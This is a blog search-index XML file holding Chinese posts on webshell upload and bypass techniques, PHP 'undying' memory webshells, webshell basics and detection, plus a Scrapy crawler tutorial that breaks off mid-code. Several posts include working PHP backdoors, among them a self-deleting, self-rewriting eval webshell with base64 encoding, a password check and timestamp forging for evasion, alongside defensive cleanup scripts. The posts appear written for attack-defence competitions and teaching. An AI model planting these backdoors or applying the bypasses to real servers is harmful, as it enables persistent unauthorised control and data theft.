<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>WebShell（3）| 木马上传方式及查杀防范</title>
      <link href="/posts/77d4ef29/"/>
      <url>/posts/77d4ef29/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>木马上传方式</h1><h2 id="直接上传">直接上传</h2><p>通过直接上传一句话木马获取webShell。</p><h2 id="数据库备份webShell">数据库备份webShell</h2><p>网站进制上传可执行文件，此时我们可以上传正常的<code>图片马</code>，然后通过数据库备份功能修改备份后的文件名，使得<code>图片马</code>能够成功解析执行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy/b 1.jpg+1.txt 2.jpg   # 将文件写入图片中，这里的文件不局限于txt文件</span><br></pre></td></tr></table></figure><p>有时候数据库备份功能对备份的地址做了前端的限制，只需修改前端源码，成功绕过。</p><h2 id="突破本地js验证webShell">突破本地js验证webShell</h2><p>若网站对上传只做了前端限制，可以通过修改前端代码或者删除检测代码，还可以通过抓包改包成功上传一句话木马。</p><h2 id="上传其他脚本webShell">上传其他脚本webShell</h2><p>有时候一台服务器上由于搭建了不同脚本的几个网站，导致服务可同时执行多种脚本，此时我们可以尝试上传其他脚本来绕过对某一脚本的限制。</p><h2 id="00截断webShell">00截断webShell</h2><p>00截断是利用服务器对%00后面的字符不再识别，导致攻击者可构造<code>%00</code>之前的后缀名为可执行文件，成功绕过<code>白名单限制</code>。</p><h2 id="解析漏洞webShell">解析漏洞webShell</h2><p>利用不同服务器存在的解析漏洞成功绕过后缀名限制上传。如<code>IIS</code>、<code>apache</code>、<code>nginx</code>等</p><h2 id="利用编辑器漏洞webShell">利用编辑器漏洞webShell</h2><p>有些网站在编辑界面应用了存在已知漏洞的编辑器，可利用漏洞直接getShell，或者配合解析漏洞上传木马getShell。如<code>fckeditor</code>、<code>ewebeditor</code>、<code>cheditor</code>等</p><h2 id="网站配置插马webShell">网站配置插马webShell</h2><p>一些网站在后台存在网站配置，比如配置网站首页公司名称等信息，此处可直接插入一句话木马。配置界面插马要非常小心，最好下载源码，分析源码闭合代码插入一句话，防止网站被插废。</p><h2 id="通过编辑模板webShell">通过编辑模板webShell</h2><p>通过对网站的模板编辑写入一句换，利用解析漏洞生成脚本getShell</p><p>还可以将一句换木马打包为压缩文件，上传后解压到网站成功getShell</p><h2 id="修改脚本文件直接getShell">修改脚本文件直接getShell</h2><p>有的网站管理员可以修改脚本，攻击者可在脚本中插入一句话木马成功getShell</p><h2 id="数据库命令执行webShell">数据库命令执行webShell</h2><p>有的网站管理员可直接在前端执行sql语句，此时我们可以通过创建数据库写入一句话，再将一句话导出到网站根目录，连接getShell</p><h2 id="文件包含webShell">文件包含webShell</h2><p>当防火墙对可执行脚本过滤比较严格时，可以通过文件包含的方式绕过。</p><p>首先上传一张图片马（后缀为jpg/png等网站允许上传的格式），然后上传包含可执行文件，将上传的文件包含进去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include( &quot;xxx.jpg&quot;);?&gt;       # php</span><br><span class="line">&lt;!--#include file=&quot;xxx.jpg&quot;--&gt;     # asp</span><br></pre></td></tr></table></figure><h2 id="命令执行webShell">命令执行webShell</h2><p>网站存在可执行命令的地方可直接用<code>echo</code>函数写入一句。</p><h2 id="Sql注入webShell">Sql注入webShell</h2><p>存在sql注入的网站，如果有足够的权限并且可以得到绝对路径，我们就可以直接使用<code>select into......outfile</code>函数直接写入一句话到网站根目录。</p><h1>木马查杀防范</h1><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>针对一句话木马</span></div>    <div class="hide-content"><ol><li><p>日志排查<br>针对Webshell正在使用的常见关键字过滤服务器访问和错误日志，包括文件名称和/或参数名称。<br>根据下面的示例，在Apache HTTP Server访问日志中的URL中搜索字符串文件。<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/1.492nhtavxti0.jpg" alt="1.png"></p></li><li><p>文件系统搜索<br>文件系统（通常是Web服务器根目录）中搜索文件或文件名中的通用字符串。<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/2.3u5j4t9b79i0.jpg" alt="2.png"><br>如果搜索到很长的字符串，这可能表示已进行了编码。一些后门程序具有数千行代码。<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/3.570zga084ek0.jpg" alt="3.png"></p></li><li><p>搜索最近X天修改过的文件<br>我们可以通过搜索了前一天或前一小时更改的*.php文件来进行排查</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.php -mtime -1 -ls    # 搜索前一天</span><br><span class="line">find / -name *.php -mmin -60 -ls    # 搜索前一小时</span><br></pre></td></tr></table></figure><p>但建议搜索所有更改过的文件，毕竟webShell也可以嵌入到图像或任何其他文件中。</p></li><li><p>.htaccess文件的分析<br>分析<code>.htaccess</code>文件是否进行了修改。以下是攻击者可能对.htaccess文件进行更改的示例<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/4.4qjxp5zgmzs0.jpg" alt="4.png"></p></li><li><p>监控异常流量<br>监视网络中存在异常的网络流量和连接。<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/5.2gnmmeyy4x34.jpg" alt="5.png"></p></li><li><p>借助软件查杀<br>下载网站源码至本地，通过<code>D盾</code>、<code>Seay源代码审计系统</code>等软件进行查杀</p></li></ol></div></div><div class="hide-toggle" style="border: 1px solid  #fff8e9"><div class="hide-button toggle-title" style="background-color:  #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>针对内存马（不死马）</span></div>    <div class="hide-content"><p>由于内存马，即不死马，具有无文件落地、极难检测和发现等特性，难以清除。<br>针对不死马，我们有以下方法可以进行检测</p><ol><li><p>重启服务器<br>简单粗暴，重启服务器，然后删除木马文件。但大多数awd比赛会因为<code>重启失分</code>，所以不能频繁重启服务。</p></li><li><p>日志的排查<br>在上面的一句话木马的检测排查的基础上，重点关注一些<code>不明路径</code>以及它的<code>出现频率</code>，可通过此查看其木马文件名。</p></li><li><p>重写木马文件<br>我们可以通过不断向木马文件重写来克制，前提是写入速度要<code>大于</code>不死马的生成速度，且已知<code>木马文件名</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     set_time_limit(<span class="number">0</span>);</span><br><span class="line">     ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">     unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">     <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">         file_put_contents(<span class="string">&#x27;./shell.php&#x27;</span>,<span class="string">&#x27;11111&#x27;</span>);</span><br><span class="line">         usleep(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>bash脚本删除<br>通过编写bash脚本不断的进行删除木马文件，前提是已知<code>木马文件名</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> : ;<span class="keyword">do</span> rm -rf .shell.php; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></li><li><p>清除进程<br>不断地删除程序以及杀死进程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">         <span class="variable">$pid</span>=xxx;                   <span class="comment"># 进程号</span></span><br><span class="line">         @unlink(<span class="string">&#x27;shell.php&#x27;</span>); </span><br><span class="line">         exec(<span class="string">&#x27;kill -9 $pid&#x27;</span>);       <span class="comment"># 强制清除进程</span></span><br><span class="line">         usleep(<span class="number">1000</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol></div></div><h1>预防措施</h1><p>通常，黑客会利用Web服务器软件中存在的漏洞来安装webShell。 因此，消除这些漏洞对于避免失陷Web服务器的潜在风险很重要。<br>以下是一些与webShell相关的预防措施。</p><ol><li><p>如果不使用，要禁用危险的PHP函数，例如<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>、<code>system()</code>、<code>show_source()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>eval()</code>与<code>assert()</code>。</p></li><li><p>如果必须要启用这些命令，请确保未授权用户无法访问这些脚本。此外，使用<code>escapeshellarg()</code>和<code>escapeshellcmd()</code>可以确保不能将用户输入注入到shell命令中，从而导致命令执行漏洞。</p></li><li><p>如果Web应用程序正在使用上传表单，请确保上传的表单是安全的，并且仅允许上传<code>白名单</code>所允许的文件类型。</p></li><li><p>不要相信用户输入的信息。</p></li><li><p>不要盲目使用在线论坛或网站上的代码。</p></li><li><p>对于<code>WordPress</code>，如果不需要，要<code>避免</code>安装第三方插件。如果需要使用插件，请确保插接件其信誉良好且经常更新。</p></li><li><p>在敏感目录（如图片或上传）中<code>禁用</code>PHP执行。</p></li><li><p><code>锁定</code>Web服务器用户权限。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> webShell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webShell </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebShell（2）| 内存马（不死马）</title>
      <link href="/posts/8a6b0e5b/"/>
      <url>/posts/8a6b0e5b/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>什么是内存马</h1><p>内存马是<code>无文件攻击</code>的一种常用手段，随着攻防演练热度越来越高：攻防双方的博弈，流量分析、EDR等专业安全设备被蓝方广泛使用，传统的文件上传的webShell或以文件形式驻留的后门越来越容易被检测到，内存马使用越来越多。</p><p>webShell内存马，是在<code>内存中</code>写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的<code>对外窗口</code>：网站、应用。<br>但传统的webShell都是<code>基于文件类型</code>的，攻击者可以利用上传工具或网站漏洞植入木马。<br>而其中的区别在于webShell内存马是<code>无文件马</code>，利用<code>中间件</code>的<code>进程</code>执行某些恶意代码，不会有文件落地，给检测带来巨大难度。</p><div class="note info flat"><p>Java内存马可参考文章——<a href="https://www.freebuf.com/articles/web/274466.html">一文看懂内存马</a></p></div><h1>PHP内存马</h1><p>PHP内存马，也叫做PHP不死马、不死僵尸，在线下AWD比赛中是常用手段之一，用于<code>权限维持</code>。<br>在蚁剑中也有专门的插件可以一键注入内存马。原理也很简单，相对于Java可以直接把整个shell写入内存，php内存马的实现则是将一个木马反复写入，达到<code>无法删除</code>的目的。</p><p>不死马原型如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);                   <span class="comment">//设置客户端断开连接时是否中断脚本的执行</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);                         <span class="comment">//设置脚本最大执行时间，linux下可能不大好用</span></span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);                           <span class="comment">//删除当前文件本身，以起到隐蔽自身的作用</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;                        <span class="comment">//文件名</span></span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;    <span class="comment">//恶意代码</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);     <span class="comment">//打开file文件，然后写入code</span></span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">100</span>);                             <span class="comment">//延迟执行可有可无</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传之后,访问该页面，就会不断生成<code>shell.php</code>，我们就直接可以利用<code>shell.php</code><br>但是原型有一个<code>缺点</code>：while里面只是判断了这个文件是否存在, 那么只要把文件中的shell注释掉就可以绕过你的内存木马了。</p><h1>木马改进</h1><p>在原型的基础上，我们可以进行改进一下</p><ol><li><p>在文件前面加个点<code>.</code>在Linux系统中变成<code>隐藏文件</code>，用来隐蔽自己</p></li><li><p>为了<code>防止</code>被其他人利用，可以对<code>恶意代码</code>进行修改，用<code>md5</code>加密验证，或者其他利用方法验证，只要不让其他人搭顺风车都可以</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$_GET</span>[<span class="string">&quot;pwd&quot;</span>]) == <span class="string">&quot;9003d1df22eb4d3820015070385194c8&quot;</span>)&#123;      </span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>密码为pwd，只有参数<code>pwd</code>正确时，才可使用<code>cmd</code>参数</p></li><li><p>对<code>恶意代码</code>进行一个<code>base编码</code>，绕过简单查杀</p></li><li><p>修改if语句内的判断，改为<code>md5加密的内容匹配</code></p></li><li><p>赋予木马文件<code>最高</code>权限<code>777</code></p></li><li><p>设置修改木马文件的<code>修改时间</code></p></li></ol><p>改进后示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.shell.php&#x27;</span>;                                   </span><br><span class="line">    <span class="variable">$code</span> = base64_decode(<span class="string">&#x27;PD9waHAgCiAgICAgICAgaWYobWQ1KCRfR0VUWyJwd2QiXSkgPT0gIjkwMDNkMWRmMjJlYjRkMzgyMDAxNTA3MDM4NTE5NGM4Iil7ICAgICAgCiAgICAgICAgICAgIEBldmFsKCRfUkVRVUVTVFtjbWRdKTsKICAgICAgICB9IAogICAgPz4=&#x27;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>)) !== md5(<span class="variable">$code</span>)) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&#x27;chmod 777 &#x27;</span>.<span class="variable">$file</span>);</span><br><span class="line">        touch(<span class="variable">$file</span>, mktime(hour, minute, second, month, day, year));</span><br><span class="line">        usleep(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="note warning flat"><p>以上都是一些思路，若还有其他补充的还请大佬赐教，可用于Awd比赛，切勿用于不法之地！</p></div>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> webShell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webShell </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebShell（1）| 基础详解</title>
      <link href="/posts/510672c5/"/>
      <url>/posts/510672c5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note default flat"><p>前段时间忙着项目，awd比赛等，都没怎么写博客，不是没学，是不知道写啥。<br>好了，话不多说，2022年的第一篇博客。</p></div><h1>WebShell基础</h1><h2 id="什么是WebShell">什么是WebShell?</h2><p>顾名思义，<code>web</code>的含义是显然需要服务器开放web服务，<code>shell</code>的含义是取得对服务器某种程度上操作权限。<br>webShell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webShell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p><p>webShell就是以<code>asp</code>、<code>php</code>、<code>jsp</code>或者<code>cgi</code>等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。</p><p><code>入侵者</code>在入侵了一个网站后，通常会将asp或php后门文件与网站目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到<code>控制网站服务器</code>的目的。</p><div class="note primary flat"><p><code>Shell</code>是一个人机交互页面，能操控服务器并获取权限。</p></div><p><code>Shell</code>文件有个变态的地方，就是可从服务器那边接收数据并执行、返回结果，也就是说只要把shell文件上传到目标服务器，就能操控服务器了。</p><div class="note warning no-icon flat"><p>利用webShell可以在Web服务器上执行系统命令、窃取数据、植入病毒、勒索核心数据、SEO挂马等恶意操作，危害极大。</p></div><h2 id="WebShell的特点">WebShell的特点</h2><p><code>入侵者</code>使用webShell的第一步通常是将其上传到可访问的服务器中，例如利用用户CMS系统的第三方插件中的漏洞上传一个简单的php webShell。</p><p>当然，webShell类型和作用也不完全相同<br>一些简单的webShell只起到连接外界的作用，允许入侵者插入更加精准的恶意脚本，执行他们所需要的指令；<br>另外一些则可能更加复杂，带有数据库或文件浏览器，让入侵者能够从数千英里之外的地方查看入侵系统的代码和数据。</p><div class="note danger flat"><p>无论何种设计，webShell都极其危险，是网络罪犯和高级持续威胁(APTs)的常用工具。</p></div><p>webShell常见的攻击特点主要有以下几点：</p><ol><li><p>持久化远程访问<br>webShell脚本通常会包含后门，入侵者上传webShell之后，就可以充分利用webShell的<code>后门</code>实现<code>远程访问并控制服务器</code>，从而达到长期控制网站服务器的目的。<br>此外，在上传完webShell之后，入侵者会选择自己修复漏洞，以确保没有其他人会利用该漏洞。<br>通过这种方式，入侵者就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p></li><li><p>提权<br>在服务器没有配置错误的情况下，webShell将在web服务器的用户权限下运行，而用户权限是有限的。<br>通过webShell，入侵者可以利用系统上的本地漏洞来实现权限提升，从而获得Root权限，这样入侵者基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p></li><li><p>隐蔽性极强<br>webShell可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制的服务器或远程主机交互的数据都是通过80端口传递，因此不会被防火墙拦截。<br>在没有记录流量的情况下，webShell使用post包发送，也不会被记录在系统日志中，只会在Web日志中记录一些数据提交的记录。</p></li></ol><h2 id="WebShell的分类">WebShell的分类</h2><p>webShell根据脚本可以分为<code>php</code>脚本木马，<code>asp</code>脚本木马，<code>jsp</code>脚本木马，也有基于<code>.NET</code>的脚本木马。</p><p>根据时代和技术的变迁，也有用<code>python</code>和<code>lua</code>编写的脚本木马，常用有如下几种：</p><ol><li><p>大马</p><ul><li>体积大，功能全</li><li>会调用系统关键函数</li><li>以代码加密进行隐藏</li><li>一般入侵者会设置密码进入</li></ul></li><li><p>小马</p><ul><li>体积小，功能少</li><li>一般只有一个上传功能，用于上传大马</li></ul></li><li><p>一句话木马</p><ul><li>代码短 使用场景大，</li><li>可单独生成文件，可插入文件</li><li>安全性高，隐藏性强，可变形免杀</li><li>框架不变，数据执行，数据传递</li></ul><div class="note purple icon flat"><i class="note-icon far fa-hand-scissors"></i><p>对一句话木马的具体详细讲解可参考下面大佬的文章：<br><a href="https://www.kitsch.live/2020/12/25/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e2%91%a0%e4%b8%80%e5%8f%a5%e8%af%9d%e6%9c%a8%e9%a9%ac/">WebShell①一句话木马</a><br><a href="https://www.uedbox.com/post/6051/">那些强悍的PHP一句话后门</a><br>写得很好，就不班门弄斧了嘻嘻</p></div></li><li><p>打包马</p><ul><li>主要用于打包网站源码</li></ul></li><li><p>拖库马</p><ul><li>主要用于导出网站数据库</li></ul></li><li><p>内存马（也叫不死马）</p><ul><li>无文件落地</li><li>极难检测和发现</li><li>难以清除</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> webShell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webShell </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy爬虫框架</title>
      <link href="/posts/8386228b/"/>
      <url>/posts/8386228b/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Scrapy框架概念">Scrapy框架概念</h2><p><code>Scrapy</code>是一个Python编写的开源网络爬虫框架。它是一个被设计用于爬取网络数据、提取结构性数据的框架。</p><p>Scrapy文档地址：<a href="http://scrapy-chs.readthedocs.io/zh_CN/1.0/intro/overview.html">http://scrapy-chs.readthedocs.io/zh_CN/1.0/intro/overview.html</a></p><h2 id="Scrapy框架作用">Scrapy框架作用</h2><p>少量的代码，就能够快速的抓取。一般用于爬取大量数据。</p><h2 id="Scrapy框架工作流程">Scrapy框架工作流程</h2><ol><li><p>回顾request的爬虫流程</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/%E5%8E%9F%E5%A7%8B%E7%9A%84%E7%88%AC%E8%99%AB%E6%B5%81%E7%A8%8B.1a7d9jv58bmo.jpg" alt="原始的爬虫流程"></p><p>我们可以在此基础上改写流程：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/%E6%94%B9%E5%86%99%E7%9A%84%E7%88%AC%E8%99%AB%E6%B5%81%E7%A8%8B.ef49avaji3k.png" alt="改写的爬虫流程"></p><p>而上面改写的流程图也更加便于大家去理解scrapy的流程</p></li><li><p>Scapy的流程</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/scapy%E7%9A%84%E6%B5%81%E7%A8%8B.2rcpyfhjjoo0.png" alt="scapy的流程"></p><h3 id="其流程详细如下：">其流程详细如下：</h3><ol><li>爬虫中起始的url构造成request对象——&gt;爬虫中间件——&gt;引擎——&gt;调度器</li><li>调度器把request——&gt;引擎——&gt;下载中间件——&gt;下载器</li><li>下载器发送请求，获取response响应——&gt;下载中间件——&gt;引擎——&gt;爬虫中间件——&gt;爬虫</li><li>爬虫提取url地址，组装成request对象——&gt;爬虫中间件——&gt;引擎——&gt;调度器，重复步骤2</li><li>爬虫提取数据——&gt;引擎——&gt;管道处理和保存数据</li></ol></li></ol><div class="note warning no-icon flat"><p>​注意：</p><ul><li>图中绿色线条的表示数据的传递</li><li>注意图中中间件的位置，决定了其作用</li><li>注意其中引擎的位置，所有的模块之前相互独立，只和引擎进行交互</li></ul></div><h2 id="各模块的具体作用">各模块的具体作用</h2><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/%E5%90%84%E6%A8%A1%E5%9D%97%E4%BD%9C%E7%94%A8.5z8n2kdpqtw0.jpg" alt="各模块作用"></p><p>​各模块功能：</p><ul><li>引擎 —— 数据和信号的传递</li><li>调度器 —— 任务url队列</li><li>下载器 —— 发送请求、获取响应</li><li>爬虫 —— 起始的url、解析数据</li><li>管道 —— 保存数据</li><li>中间件 —— 定制化操作</li></ul><h2 id="三个内置对象">三个内置对象</h2><ul><li>request请求对象：由url、method、post_data、headers等构成</li><li>response响应对象：由url、body、status、headers等构成</li><li>item数据对象：本质是个字典</li></ul><h2 id="安装">安装</h2><p>有时pip版本过于老旧不能使用，需要升级pip版本，输入<code>pip install --upgrade pip</code>回车，升级成功</p><p>安装scrapy命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip/pip3 install Scrapy</span><br></pre></td></tr></table></figure><h2 id="scrapy项目开发流程">scrapy项目开发流程</h2><ol><li>创建项目</li><li>生成一个爬虫</li><li>提取数据</li><li>保存数据</li></ol><h2 id="创建项目">创建项目</h2><p>创建scrpy项目的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject &lt;项目名字&gt;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject myspider</span><br></pre></td></tr></table></figure><h2 id="创建爬虫">创建爬虫</h2><div class="note info flat"><p>通过命令创建出爬虫文件，爬虫文件为主要的代码作业文件，通常一个网站的爬取动作都会在爬虫文件中进行编写。</p></div><p>命令：在<strong>项目路径下</strong>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider &lt;爬虫名字&gt; &lt;允许爬取的域名&gt;</span><br></pre></td></tr></table></figure><ul><li>爬虫名字：作为爬虫运行时的参数</li><li>允许爬取的域名：为对于爬虫设置的爬取范围，设置之后用于过滤要爬取的url，如果爬取的url与允许的域不通则被过滤掉。如不确定时，<a href="http://xn--xx-hf3c34q0p7dlpp.com">可以设置xx.com</a>，后期再进行修改。</li></ul><p>这里我们以<code>豆瓣电影Top250</code>作为示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd myspider</span><br><span class="line">scrapy genspider douban movie.douban.com</span><br></pre></td></tr></table></figure><p>生成的目录和文件结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%80%BB%E8%A7%88.5z4b3r667x00.jpg" alt="目录文件总览"></p><h2 id="完善爬虫">完善爬虫</h2><p>在上一步生成出来的爬虫文件中编写指定网站的数据采集操作，实现数据提取</p><p><strong>一、在item.py中定义要提取的字段</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyspiderItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    num = scrapy.Field()<span class="comment"># 电影序号   </span></span><br><span class="line">    name = scrapy.Field()<span class="comment"># 电影名字</span></span><br><span class="line">    score = scrapy.Field()<span class="comment"># 电影评分   </span></span><br><span class="line">    con = scrapy.Field()<span class="comment"># 电影简介</span></span><br></pre></td></tr></table></figure><p><strong>二、在/myspider/myspider/spiders/douban.py 中修改内容如下</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> MyspiderItem</span><br><span class="line"></span><br><span 